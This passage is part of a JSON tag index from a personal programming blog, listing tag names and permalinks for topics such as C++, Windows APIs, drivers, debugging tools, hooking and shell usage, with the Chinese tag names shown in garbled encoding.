"https://hodlyounger.github.io/tags/CPP-future/"},{"name":"CPP/std","slug":"CPP-std","permalink":"https://hodlyounger.github.io/tags/CPP-std/"},{"name":"LeetCode/é˜Ÿåˆ—","slug":"LeetCode-é˜Ÿåˆ—","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E9%98%9F%E5%88%97/"},{"name":"LeetCode/æ ˆ","slug":"LeetCode-æ ˆ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%A0%88/"},{"name":"Code\\CPP","slug":"Code-CPP","permalink":"https://hodlyounger.github.io/tags/Code-CPP/"},{"name":"Json","slug":"Json","permalink":"https://hodlyounger.github.io/tags/Json/"},{"name":"std::bind","slug":"std-bind","permalink":"https://hodlyounger.github.io/tags/std-bind/"},{"name":"cpp/String","slug":"cpp-String","permalink":"https://hodlyounger.github.io/tags/cpp-String/"},{"name":"å†…å­˜åˆ†é…","slug":"å†…å­˜åˆ†é…","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/"},{"name":"C","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"},{"name":"Unicode","slug":"Unicode","permalink":"https://hodlyounger.github.io/tags/Unicode/"},{"name":"Code/æ±‡ç¼–","slug":"Code-æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/Code-%E6%B1%87%E7%BC%96/"},{"name":"OS","slug":"OS","permalink":"https://hodlyounger.github.io/tags/OS/"},{"name":"windows/é©±åŠ¨","slug":"windows-é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/windows-%E9%A9%B1%E5%8A%A8/"},{"name":"driver","slug":"driver","permalink":"https://hodlyounger.github.io/tags/driver/"},{"name":"windows/ç½‘å¡","slug":"windows-ç½‘å¡","permalink":"https://hodlyounger.github.io/tags/windows-%E7%BD%91%E5%8D%A1/"},{"name":"Windows/API","slug":"Windows-API","permalink":"https://hodlyounger.github.io/tags/Windows-API/"},{"name":"ç›‘æ§","slug":"ç›‘æ§","permalink":"https://hodlyounger.github.io/tags/%E7%9B%91%E6%8E%A7/"},{"name":"ç½‘ç»œç¼–ç¨‹/route","slug":"ç½‘ç»œç¼–ç¨‹-route","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-route/"},{"name":"windows/winsock","slug":"windows-winsock","permalink":"https://hodlyounger.github.io/tags/windows-winsock/"},{"name":"iphelper","slug":"iphelper","permalink":"https://hodlyounger.github.io/tags/iphelper/"},{"name":"ip","slug":"ip","permalink":"https://hodlyounger.github.io/tags/ip/"},{"name":"Windows/é”","slug":"Windows-é”","permalink":"https://hodlyounger.github.io/tags/Windows-%E9%94%81/"},{"name":"CPP/é”","slug":"CPP-é”","permalink":"https://hodlyounger.github.io/tags/CPP-%E9%94%81/"},{"name":"sysinfo","slug":"sysinfo","permalink":"https://hodlyounger.github.io/tags/sysinfo/"},{"name":"os","slug":"os","permalink":"https://hodlyounger.github.io/tags/os/"},{"name":"Windows/æƒé™","slug":"Windows-æƒé™","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%9D%83%E9%99%90/"},{"name":"é™æƒ","slug":"é™æƒ","permalink":"https://hodlyounger.github.io/tags/%E9%99%8D%E6%9D%83/"},{"name":"ä¼šè¯","slug":"ä¼šè¯","permalink":"https://hodlyounger.github.io/tags/%E4%BC%9A%E8%AF%9D/"},{"name":"windows/æœåŠ¡","slug":"windows-æœåŠ¡","permalink":"https://hodlyounger.github.io/tags/windows-%E6%9C%8D%E5%8A%A1/"},{"name":"Windows/service","slug":"Windows-service","permalink":"https://hodlyounger.github.io/tags/Windows-service/"},{"name":"Windows/registry","slug":"Windows-registry","permalink":"https://hodlyounger.github.io/tags/Windows-registry/"},{"name":"å·¥å…·é›†","slug":"å·¥å…·é›†","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E5%85%B7%E9%9B%86/"},{"name":"ä¿¡æ¯","slug":"ä¿¡æ¯","permalink":"https://hodlyounger.github.io/tags/%E4%BF%A1%E6%81%AF/"},{"name":"semaphores","slug":"semaphores","permalink":"https://hodlyounger.github.io/tags/semaphores/"},{"name":"ms-settings","slug":"ms-settings","permalink":"https://hodlyounger.github.io/tags/ms-settings/"},{"name":"å¿«æ·æ–¹å¼","slug":"å¿«æ·æ–¹å¼","permalink":"https://hodlyounger.github.io/tags/%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/"},{"name":"windows/æ‰˜ç›˜","slug":"windows-æ‰˜ç›˜","permalink":"https://hodlyounger.github.io/tags/windows-%E6%89%98%E7%9B%98/"},{"name":"tray","slug":"tray","permalink":"https://hodlyounger.github.io/tags/tray/"},{"name":"å†…å­˜æ³„æ¼","slug":"å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"å®æˆ˜","slug":"å®æˆ˜","permalink":"https://hodlyounger.github.io/tags/%E5%AE%9E%E6%88%98/"},{"name":"UMDH","slug":"UMDH","permalink":"https://hodlyounger.github.io/tags/UMDH/"},{"name":"Windows/WinDbg","slug":"Windows-WinDbg","permalink":"https://hodlyounger.github.io/tags/Windows-WinDbg/"},{"name":"tools","slug":"tools","permalink":"https://hodlyounger.github.io/tags/tools/"},{"name":"Windows/windbg","slug":"Windows-windbg","permalink":"https://hodlyounger.github.io/tags/Windows-windbg/"},{"name":"å…±äº«æ–‡ä»¶å¤¹","slug":"å…±äº«æ–‡ä»¶å¤¹","permalink":"https://hodlyounger.github.io/tags/%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9/"},{"name":"bug","slug":"bug","permalink":"https://hodlyounger.github.io/tags/bug/"},{"name":"å‰ªåˆ‡æ¿","slug":"å‰ªåˆ‡æ¿","permalink":"https://hodlyounger.github.io/tags/%E5%89%AA%E5%88%87%E6%9D%BF/"},{"name":"Windows/æ‰¹å¤„ç†","slug":"Windows-æ‰¹å¤„ç†","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%89%B9%E5%A4%84%E7%90%86/"},{"name":"windows/bat","slug":"windows-bat","permalink":"https://hodlyounger.github.io/tags/windows-bat/"},{"name":"windows/æ–‡ä»¶å¤¹","slug":"windows-æ–‡ä»¶å¤¹","permalink":"https://hodlyounger.github.io/tags/windows-%E6%96%87%E4%BB%B6%E5%A4%B9/"},{"name":"route","slug":"route","permalink":"https://hodlyounger.github.io/tags/route/"},{"name":"windows/CMD","slug":"windows-CMD","permalink":"https://hodlyounger.github.io/tags/windows-CMD/"},{"name":"windows/winuser","slug":"windows-winuser","permalink":"https://hodlyounger.github.io/tags/windows-winuser/"},{"name":"Windows/wmi","slug":"Windows-wmi","permalink":"https://hodlyounger.github.io/tags/Windows-wmi/"},{"name":"Windows/ç­¾å","slug":"Windows-ç­¾å","permalink":"https://hodlyounger.github.io/tags/Windows-%E7%AD%BE%E5%90%8D/"},{"name":"æ•´ç†","slug":"æ•´ç†","permalink":"https://hodlyounger.github.io/tags/%E6%95%B4%E7%90%86/"},{"name":"æ€è€ƒ","slug":"æ€è€ƒ","permalink":"https://hodlyounger.github.io/tags/%E6%80%9D%E8%80%83/"},{"name":"é”™è¯¯","slug":"é”™è¯¯","permalink":"https://hodlyounger.github.io/tags/%E9%94%99%E8%AF%AF/"},{"name":"Windows/Visual-Studio","slug":"Windows-Visual-Studio","permalink":"https://hodlyounger.github.io/tags/Windows-Visual-Studio/"},{"name":"code/shellcode","slug":"code-shellcode","permalink":"https://hodlyounger.github.io/tags/code-shellcode/"},{"name":"Windows/dll","slug":"Windows-dll","permalink":"https://hodlyounger.github.io/tags/Windows-dll/"},{"name":"Windows/exe","slug":"Windows-exe","permalink":"https://hodlyounger.github.io/tags/Windows-exe/"},{"name":"Porcmon","slug":"Porcmon","permalink":"https://hodlyounger.github.io/tags/Porcmon/"},{"name":"sysinternalssuite","slug":"sysinternalssuite","permalink":"https://hodlyounger.github.io/tags/sysinternalssuite/"},{"name":"hook","slug":"hook","permalink":"https://hodlyounger.github.io/tags/hook/"},{"name":"Detours","slug":"Detours","permalink":"https://hodlyounger.github.io/tags/Detours/"},{"name":"DLL","slug":"DLL","permalink":"https://hodlyounger.github.io/tags/DLL/"},{"name":"Windows/æ–‡ä»¶","slug":"Windows-æ–‡ä»¶","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%96%87%E4%BB%B6/"},{"name":"OS/Mac","slug":"OS-Mac","permalink":"https://hodlyounger.github.io/tags/OS-Mac/"},{"name":"Xcode","slug":"Xcode","permalink":"https://hodlyounger.github.io/tags/Xcode/"},{"name":"å¯¼è¯»","slug":"å¯¼è¯»","permalink":"https://hodlyounger.github.io/tags/%E5%AF%BC%E8%AF%BB/"},{"name":"rpc","slug":"rpc","permalink":"https://hodlyounger.github.io/tags/rpc/"},{"name":"è¿›ç¨‹ä¸ç¨‹åº","slug":"è¿›ç¨‹ä¸ç¨‹åº","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%A8%8B%E5%BA%8F/"},{"name":"è¿›ç¨‹çš„è¡ç”Ÿ","slug":"è¿›ç¨‹çš„è¡ç”Ÿ","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%A1%8D%E7%94%9F/"},{"name":"å·¥ä½œç®¡ç†","slug":"å·¥ä½œç®¡ç†","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E4%BD%9C%E7%AE%A1%E7%90%86/"},{"name":"shell","slug":"shell","permalink":"https://hodlyounger.github.io/tags/shell/"},{"name":"zsh","slug":"zsh","permalink":"https://hodlyounger.github.io/tags/zsh/"},{"name":"å‘½ä»¤","slug":"å‘½ä»¤","permalink":"https://hodlyounger.github.io/tags/%E5%91%BD%E4%BB%A4/"},{"name":"æŸ¥è¯¢","slug":"æŸ¥è¯¢","permalink":"https://hodlyounger.github.io/tags/%E6%9F%A5%E8%AF%A2/"},{"name":"Doxygen","slug":"Doxygen","permalink":"https://hodlyounger.github.io/tags/Doxygen/"}]}